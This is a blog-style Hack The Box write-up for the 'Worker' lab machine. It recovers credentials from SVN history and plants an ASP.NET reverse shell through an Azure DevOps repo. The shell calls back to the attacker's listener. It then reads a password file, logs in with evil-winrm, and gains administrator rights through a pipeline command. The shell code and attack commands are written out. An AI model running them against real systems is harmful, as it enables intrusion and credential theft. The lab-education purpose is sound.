---
layout: single
title: worker - Hack The Box
excerpt: Worker is a simple box that included SVN which exposed credentials leading to an RCE; After navigating through the web application, we do a command injection as administrator 
date: 2021-01-30
classes: wide
header:
  teaser: /assets/images/htb-writeup-worker/worker_logo.png
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - svn
  - command_injection
---

![](/assets/images/htb-writeup-worker/worker_logo.png)


 
## TO-DO list

- Enumerating SVN
- Using the credentials to get a shell using winRM
- Enumerating the system to get more credentials
- Use the credentials to login into the devops page as a priviledged user
- Create a pipeline and execute commands as an administrator


## Initial Foothold

Let's start by doing nmap scans. I'm doing a full TCP scan, along with a full UDP scan so we won't miss something


```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-30 00:58 CST
Nmap scan report for dimension.worker.htb (10.10.10.203)
Host is up (0.094s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Dimension by HTML5 UP
3690/tcp open  svnserve Subversion
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 306.08 seconds

```

We have a web server on port 80, a subversion (SVN) service on 3690 , as well as a HTTPAPI http daemon.For a bit of context, SVN is much more like github. You can have a repoistery that includes versions and releases and what not. Chances are there is a sort of code exposure.

Now let's do  the UDP scan

```bash
sudo nmap -sU -F -oN nmap/init_udp 10.10.10.203                                                                                                                                                                                      1 ⨯
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-30 01:04 CST
Nmap scan report for dimension.worker.htb (10.10.10.203)
Host is up (0.097s latency).
All 100 scanned ports on dimension.worker.htb (10.10.10.203) are open|filtered

Nmap done: 1 IP address (1 host up) scanned in 10.84 seconds
```

and nothing came up. let's enumerate the SVN service for now. In general we'll look up for repos in the SVN and check through each commit (revision) for anything saucy

```bash
Subversion is a tool for version control.
For additional information, see http://subversion.apache.org/
                                                                                                                                                                                                                                             
└─$ svn list svn://10.10.10.203/    
sddimension.worker.htb/
moved.txt
                                                                                                                                                                                                                                             
└─$ svn cat svn://10.10.10.203/moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :)
```

we can enumerate the commits/revisions by tailing `@REVISION_NUMBER` at the very end of the URI

```bash
svn list svn://10.10.10.203/@REVISION_NUMBER
svn: E205000: Try 'svn help list' for more information
svn: E205000: Syntax error parsing peg revision 'REVISION_NUMBER'
```

we can know on which commit we are right not by checking out
                                                                                                                                                                                                                                             
```bash
$svn checkout svn://10.10.10.203
	Checked out revision 5.                                                                                                                                                                                                                        
$ svn list svn://10.10.10.203/@4    
dimension.worker.htb/                                                                                                                                                                                                                                            
svn list svn://10.10.10.203/@3
deploy.ps1
dimension.worker.htb/
svn cat svn://10.10.10.203/deploy.ps1@3                                                                                                                                                                                             
$user = "nathen" 
# NOTE: We cant have my password here!!!
$plain = ""
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")                                                                                                                                                                                                                                             
 svn cat svn://10.10.10.203/deploy.ps1@2
$user = "nathen" 
$plain = "wendel98"
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
```

and bingo. We get credentials as `nathen` with the password `wendel98`. We also got a few subdomains that we want to add to our `/etc/hosts`

```bash
10.10.10.203 worker.htb
10.10.10.203 dimension.worker.htb
10.10.10.203 devops.worker.htb
```

Let's go to `devops.worker.htb` 

![](/assets/images/htb-writeup-worker/devops_login.png)

we can try our `nathen:wendel98` credentials in the devops portal, we get authenticated.


Then we are brought to a web application named "ekenas" and we are logged in as nathen or Nathalie Henley. We notice it's running Azure devops, which might enable us to run a shell by modifying the repo and uploading our shell. 
We have several repos under the team "SmartHotel360". We can get the rest of the subdomains by navigating to pipelines, and then sites.

![](/assets/images/htb-writeup-worker/devops_pipelines.png)

We can also know which sites are hosting which repos by clicking on each one and then click on view,and then "Get Sources".


let's add them all to our `/etc/hosts`

```bash
#worker 
10.10.10.203 dimension.worker.htb
10.10.10.203 alpha.worker.htb
10.10.10.203 cartoon.worker.htb
10.10.10.203 lens.worker.htb
10.10.10.203 solid-state.worker.htb
10.10.10.203 spectral.worker.htb
10.10.10.203 story.worker.htb
10.10.10.203 devops.worker.htb
10.10.10.203 spectral.worker.htb
10.10.10.203 twenty.worker.htb
```

Since we can make a new branch on any of the  SmartHotel360 team repos, we can upload a shell on a new branch and request a merge with the master branch. After that, once we are ready, we can make pipeline task which will push our malicious code onto the website and gain remote execution.

for the shell content, any web shell written in c# in the aspx format will do. Just change the IP/PORT in the shell to match your machine

```csharp
at /home/tyr4n7/HTB/useful/shell.aspx                                                                                                                                                                                             130 ⨯
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
    
	protected void Page_Load(object sender, EventArgs e)
    {
	    String host = "10.10.14.7"; //CHANGE THIS
            int port = 4994; ////CHANGE THIS
                
        CallbackShell(host, port);
    }
...
```
I'll upload the shell on Spectral repo. Let's first make a work item by going to `Boards -> Work items -> Create new work item`

![](/assets/images/htb-writeup-worker/devops_login.png)

Now navigate to the repos/Spectral, click on the master drop-down menu and and click new branch

![](/assets/images/htb-writeup-worker/new_branch.png)


after that simply click upload file and select your shell of choice and then commit. 
Click on Create a Pull request, and then Create, approve and then complete. Tadaa! Now our shell is in the main repo. After 1 mins, the shell is gonna be uploaded into the website by azure pipelines.
Open two terminals

Shell A
```bash
nc -lnvp 4995
```

Shell B
```bash
curl spectral.worker.htb/shell.aspx
```

and we get a reverse shell
```bash
└─$ nc -lnvp 4995                                 
listening on [any] 4995 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.203] 50236
Spawn Shell...
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

## User 

We can obtain a more stable shell by enumerating the users. Remember, the svn protocol hosts past versions of websites, including users and their credentials 

we can tell the user we need by looking at `C:\Users`

```powershell
c:\windows\system32\inetsrv>cd C:\User
cd C:\User
The system cannot find the path specified.

c:\windows\system32\inetsrv>cd C:\Users
cd C:\Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 32D6-9041

 Directory of C:\Users

2020-07-07  16:53    <DIR>          .
2020-07-07  16:53    <DIR>          ..
2020-03-28  14:59    <DIR>          .NET v4.5
2020-03-28  14:59    <DIR>          .NET v4.5 Classic
2020-08-17  23:33    <DIR>          Administrator
2020-03-28  14:01    <DIR>          Public
2020-07-22  00:11    <DIR>          restorer
2020-07-08  18:22    <DIR>          robisl
               0 File(s)              0 bytes
               8 Dir(s)  10�258�767�872 bytes free
```

It looks like we need robsil.

Let's look for the svn config which usually resides in DRIVE_LETTER:\svnrepos

```powershell
wmic logicaldisk get caption
Caption
C:
W:

dir C:\svnrepos
Volume in drive C has no label.
 Volume Serial Number is 32D6-9041

 Directory of C:\

File Not Found

W:\svnrepos\www\conf>dir w:\svnrepos
dir w:\svnrepos
 Volume in drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of w:\svnrepos

2020-06-20  15:04    <DIR>          .
2020-06-20  15:04    <DIR>          ..
2020-06-20  10:29    <DIR>          www
               0 File(s)              0 bytes
               3 Dir(s)  18�766�790�656 bytes free


cat w:\svnrepos\www\conf\passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
```

We can get user now as robsil with its credentials as robsil.

```powershell

./evil-winrm.rb -u robisl -p wolves11 -i 10.10.10.203                                                                                                                                                                                1 ⨯

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\robisl\Documents> id
uid=197938(robisl) gid=197121 groups=197121
*Evil-WinRM* PS C:\Users\robisl\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\robisl\Documents> 
```

There's not anything particularly interesting in the privileges.

## Privilege escalation 

When we login as robsil in the `devops.worker.htb` we are greeted with a different repo. It's also interesting to note that azure devops includes pipelines that execute code as administrator, and robisl has the ability to create a starter pipeline which we can include a command in it. I'll just put

```powershell
net localgroup administrators robisl /add
```

![](/assets/images/htb-writeup-worker/create_pipeline.png)

in the pipeline commands and that should make robisl an administartor

```powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

And with that our writeup ends. Thank you for reading this far :)

## conclusion
Worker is an interesting box that made you think creatively and look through the docs so you'd understand how to navigate through a UI. We didn't use `grep` or `find`, but I had lots of fun going outside the usual "Enumeration" stereotype. With that I thank the creator @D4nch3n for creating this pretty machine and challenging the current stigma of hackthebox.


